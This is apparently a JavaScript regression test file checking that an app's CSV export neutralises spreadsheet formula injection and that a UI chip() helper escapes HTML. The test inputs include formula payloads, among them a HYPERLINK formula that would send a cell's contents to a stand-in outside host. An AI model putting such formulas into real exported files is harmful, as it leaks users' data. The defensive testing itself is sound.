// Regression tests for audit findings (AUD-NN). One test per finding; names start "regression: AUD-NN".
import test from 'node:test';
import assert from 'node:assert/strict';
import * as exportMod from '../app/export.js';
import { chip } from '../app/ui/icons.js';

const { measurementsToCsv } = exportMod;

test('regression: AUD-07 per-run CSV export neutralises formula-leading cells', () => {
  const row = label => measurementsToCsv([{ metricId: 'a', label, value: 1, unit: '', origin: '', confidence: 1 }]).split('\r\n')[1];
  assert.ok(row('=1+1').startsWith("a,'=1+1,"));
  assert.ok(row('-1+1').startsWith("a,'-1+1,"));
  assert.ok(row('+1+1').startsWith("a,'+1+1,"));
  assert.ok(row('@SUM(A1)').startsWith("a,'@SUM(A1),"));
  assert.ok(row('\t=1').startsWith("a,'\t=1,"));
  assert.ok(row('\r=1').startsWith(`a,"'\r=1",`));
  assert.ok(row('=HYPERLINK("https://x.example/?"&B2,"Open")').startsWith(`a,"'=HYPERLINK(""https://x.example/?""&B2,""Open"")",`));
  // Every text column is guarded, not only the label.
  const all = measurementsToCsv([{ metricId: '=a', label: 'ok', value: 1, unit: '+u', origin: '@o', confidence: 1 }]).split('\r\n')[1];
  assert.equal(all, "'=a,ok,1,'+u,'@o,1");
  // Finite numbers stay numeric (negative values are not mangled); numeric-looking strings are guarded.
  const { csvCell } = exportMod;
  assert.equal(typeof csvCell, 'function', 'csvCell is exported as the shared CSV helper');
  assert.equal(csvCell(-3.5), '-3.5');
  assert.equal(csvCell(0), '0');
  assert.equal(csvCell('-3.5'), "'-3.5");
  assert.equal(csvCell(null), '');
  assert.equal(csvCell('plain'), 'plain');
  assert.equal(csvCell(Number.NEGATIVE_INFINITY), "'-Infinity");
  assert.equal(measurementsToCsv([{ metricId: 'a', label: 'L', value: -12.25, unit: 'dB', origin: 'measured', confidence: 1 }]).split('\r\n')[1], 'a,L,-12.25,dB,measured,1');
});

test('regression: AUD-12 chip() escapes its label', () => {
  const html = chip('pass', '<b>x</b> & "q"');
  assert.ok(html.includes('&lt;b&gt;x&lt;/b&gt; &amp; &quot;q&quot;'));
  assert.ok(!html.includes('<b>'));
  assert.ok(chip('pass').includes('<span>PASS</span>'));
});
